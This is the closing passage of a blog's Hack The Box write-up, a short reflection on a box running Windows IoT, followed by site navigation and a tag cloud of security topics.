<span class="code-line"></code></pre></div>

<h1 id="wrapping-up">Wrapping up</h1>
<p>I was really intrigued by the Unknown operating system but it turns out it was a
simple guessing game and once you know what the operating system was the box was
really straightforward (if you don't mess up the heavy <code>SYSTEM</code> extraction as I
did). This is clearly one of the worst box created by
<a href="https://www.hackthebox.com/home/users/profile/1190">egre55</a> even if the fact to
use Windows IOT is quit "funny".</p>
    </div>

      <footer>
          <div>
            <b>Previous article:</b> <a href="../../2020/12/htb-openkeys.html"> HTB: OpenKeyS </a>
          </div>
          <div>
            <b>Next article:</b> <a href="../../2021/02/htb-doctor.html"> HTB: Doctor </a>
          </div>

<div class="social-buttons">


</div>
      </footer>


    <div class="clearfix"></div>

</article>
<!-- /.entry -->
            </div>
        </section>

        <aside class="sidebar pure-u-7-24">
            <div class="l-box">
    <section class="module menuitems">
        <h3 class="title module-title">Menu</h3>

        <ul>
                <li>
                    <span class= "icons icons-archives"></span>
                    <a href="/archives">archives</a>
                </li>
                <li>
                    <span class= "icons icons-feeds"></span>
                    <a href="/feeds/all.atom.xml">feeds</a>
                </li>
                <li>
                    <span class= "icons icons-links"></span>
                    <a href="/pages/links.html">links</a>
                </li>
        </ul>
    </section>

    <section class="module social">
        <h3 class="title module-title">Social</h3>

        <ul>
                <li>
                    <span class= "icons icons-github"></span>
                    <a href="https://github.com/maggick">github</a>
                </li>
                <li>
                    <span class= "icons icons-twitter"></span>
                    <a href="https://twitter.com/maggick_fr">twitter</a>
                </li>
                <li>
                    <span class= "icons icons-stackoverflow"></span>
                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
                </li>
        </ul>
    </section>


<section class="module tagcloud">
    <h3 class="title module-title">Tags</h3>

    <ul>
            <li class="tag tag-4">
              <a href="../../tag/yaml.html">YAML</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/dnsadmins.html">DnsAdmins</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/sudo.html">sudo</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/metasploit.html">metasploit</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/reverse.html">reverse</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/chisel.html">chisel</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/python.html">python</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/php.html">php</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/openbsd.html">OpenBSD</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/lxd.html">lxd</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/composer.html">composer</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/web.html">web</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/webassembly.html">webassembly</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/nmap.html">nmap</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/gdbserver.html">gdbserver</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/alwaysinstallelevated.html">AlwaysInstallElevated</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/programming.html">programming</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/cewl.html">cewl</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/chef.html">chef</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/wordpress.html">wordpress</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/drupalgeddon.html">Drupalgeddon</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/cve-2019-5736.html">CVE-2019-5736</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/teamviewer.html">teamviewer</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/snmp.html">snmp</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/adminer.html">adminer</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/vault.html">vault</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/memcache.html">memcache</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/exploit.html">exploit</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/ad-recycle-bin.html">AD Recycle bin</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/cloudme.html">cloudme</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/capabilities.html">capabilities</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/nft.html">NFT</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/splunk.html">Splunk</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/openadmin.html">openAdmin</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/pandora.html">pandora</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/azure.html">Azure</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/msfvenom.html">msfvenom</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/vnc.html">VNC</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/lfi.html">lfi</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/print-nightmare.html">print nightmare</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/smb.html">SMB</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/path.html">PATH</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/re.html">RE</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/phs.html">PHS</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/dll.html">DLL</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/openemr.html">openEMR</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/umbraco.html">umbraco</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/jackson.html">jackson</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/sqli.html">SQLi</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/misc.html">misc</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/ldap.html">LDAP</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/cryptocurrency.html">cryptocurrency</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/suid.html">suid</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/impacket.html">impacket</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/winrm.html">winrm</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/iot.html">IOT</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/phishing.html">phishing</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/adb.html">adb</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/upload.html">Upload</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/logrotate.html">logrotate</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/jwt.html">jwt</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/pypi.html">pypi</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/cve.html">CVE</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/crypto.html">Crypto</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/blog.html">blog</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/bludit.html">bludit</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/android.html">Android</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/tomcat.html">tomcat</a>
            </li>
            <li class="tag tag-1">
              <a href="../../tag/security.html">security</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/msfconsole.html">msfconsole</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/vulnhub.html">vulnhub</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/vb.html">VB</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/deserialization.html">deserialization</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/xxe.html">XXE</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/php-filter.html">php filter</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/ctf.html">CTF</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/lxc.html">lxc</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/zip.html">zip</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/strapi.html">strapi</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/laravel.html">laravel</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/ssti.html">SSTI</a>
            </li>
            <li class="tag tag-1">
              <a href="../../tag/boot2root.html">boot2root</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/screen.html">screen</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/net.html">.NET</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/docker.html">docker</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/windows.html">windows</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/devops.html">devops</a>
            </li>
            <li class="tag tag-1">
              <a href="../../tag/linux.html">linux</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/core-dump.html">core dump</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/enumeration.html">enumeration</a>
            </li>
            <li class="tag tag-2">
              <a href="../../tag/challenge.html">challenge</a>
            </li>
            <li class="tag tag-1">
              <a href="../../tag/htb.html">HTB</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/john.html">john</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/git.html">git</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/javascript.html">javascript</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/scf-file-attack.html">SCF file attack</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/nano.html">nano</a>
            </li>
            <li class="tag tag-3">
              <a href="../../tag/gitlab.html">gitlab</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/xss.html">XSS</a>
            </li>
            <li class="tag tag-4">
              <a href="../../tag/ssrf.html">SSRF</a>
            </li>
    </ul>
</section>

            </div>
        </aside>
    </div>

    <section class="pure-g-r footer">
<div class="pure-u-2-3 copyright">
    <p class="l-box">
        The content of this blog in under
        <a href="https://creativecommons.org/licenses/by/4.0/"
            title="Share, adapt, use. But mention the author.">Creative Commons Attribution 4.0</a> License.

        The source code is available on <a href="https://github.com/maggick/maggick.github.io/" title="Contribute through GitHub">GitHub</a>.
    </p>
</div>

<div class="pure-u-1-3 credits">
    <p class="l-box">
        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
    </p>
</div>    </section>


</div>
</body>
</html>